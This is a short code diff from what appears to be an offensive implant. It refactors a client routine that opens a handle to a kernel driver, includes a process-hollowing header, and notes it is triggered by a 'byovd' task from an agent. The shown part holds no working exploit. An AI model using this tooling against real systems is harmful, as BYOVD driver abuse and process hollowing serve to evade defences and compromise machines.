@@ -1,13 +1,14 @@
 #include <windows.h>
 #include <stdio.h>
-#include "IoctlCommon.h"
+#include "..\shared\ioctlcommon.h"
 #include "../../processhollowing/hollow.h"
 
 const char* k = "[+]";
 const char* e = "[-]";
 const char* i = "[*]";
 
-int main() {
+// Called from agent.cpp when a "byovd" task is received.
+int RunClientPipeline() {
     printf("%s Attempting to open handle to driver at %ws...\n", i, USER_MODE_PATH);
 
     HANDLE hDevice = CreateFileW(
